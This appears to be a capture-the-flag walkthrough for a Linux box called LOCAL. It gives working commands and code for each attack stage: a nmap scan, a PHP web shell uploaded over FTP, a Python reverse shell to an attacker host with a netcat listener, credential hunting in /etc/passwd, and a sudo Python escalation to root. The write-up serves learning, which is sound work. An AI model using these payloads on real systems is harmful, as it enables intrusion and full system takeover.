# LOCAL
`LOCAL` helps us understand privilege escalation techniques on Linux machines.

# TABLE OF CONTENTS
1. [Scan](#scan)
2. [Web Shell](#web-shell)
3. [Reverse Shell](#reverse-shell)
4. [Search Information](#search-information)
5. [SSH](#ssh)
6. [Privilege Escalation](#privilege-escalation)
7. [Root Access](#root-access)

---

## Scan
### Definition
Network scanning is the process of discovering active devices and services on a network. It helps identify potential targets for further exploration.

### Steps
1. Scan the entire network to find the local IP address:
```bash
nmap -T4 -sn "my_ip_address"/24
```
2. Scan the target IP address to find open ports and services:
```bash
nmap -T4 -A -p- <ip_address>
```

---

## Web Shell
### Definition
A web shell is a malicious script uploaded to a web server to enable remote command execution or other unauthorized actions.

### Steps
1. Create a malicious file:
```bash
touch malicious.php
```

2. Add the following code to `malicious.php`:
```php
<?php
echo "connection successful!";
system($_GET['cmd']);
?>
```

3. Upload the malicious file to the FTP server:
```bash
ftp <ip_address>
put malicious.php
```

4. Open your browser and execute commands via the web shell:
```bash
http://<ip_address>/files/malicious.php?cmd=whoami
```
---

## Reverse Shell
### Definition
A reverse shell is a type of shell where the target machine connects back to the attacker's machine, allowing the attacker to execute commands remotely.

### Steps
1. Create a malicious file:
```bash
touch malicious.py
```

2. Add the following code to `malicious.py`:
```python
import sys, socket, os, pty
s = socket.socket()
s.connect(("attacker_ip_address", 4444))
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
pty.spawn("sh")
```

3. Upload the malicious file to the FTP server:
```bash
ftp <ip_address>
put malicious.py
```

4. Open a terminal and listen on the specified port:
```bash
nc -lvnp 4444
```

5. Execute the malicious file:
```bash
python3 malicious.py
```

---

## Search Information
### Definition
Searching for information on a target system can reveal sensitive data, configurations, or vulnerabilities that can be exploited.
### Steps
1. Search users connected to the system:
```bash
cat /etc/passwd
```
2. Find a password or hash:
```bash
cat /.runme.sh
```

---

## SSH
### Definition
SSH (Secure Shell) is a protocol used to securely connect to remote machines and execute commands.

### Steps
1. Try to connect to the SSH server:
```bash
ssh <user>@<ip_address>
```

---

## Privilege Escalation
### Definition
Privilege escalation is the process of gaining higher-level permissions on a system, often to perform unauthorized actions.

### Steps
1. Check the `sudo` permissions:
```bash
sudo -l
```

2. If you have permission to run commands as root, execute the following:
```bash
sudo /usr/bin/python3.5 -c 'import os; os.system("/bin/bash")'
```

---

## Root Access
### Definition
Root access refers to having the highest level of permissions on a Linux system, allowing full control over the machine.

### Steps
1. Verify if you have root access:
```bash
whoami
```

2. Navigate to the directory containing the flag:
```bash
cd /root
```

3. Display the contents of the flag file:
```bash
cat root.txt
```

---

## Notes
- **Ethical Use**: This project is for educational purposes only. Ensure you have permission before testing these techniques.
- **Improvements**: Add screenshots, detailed explanations, or prevention techniques to enhance this guide.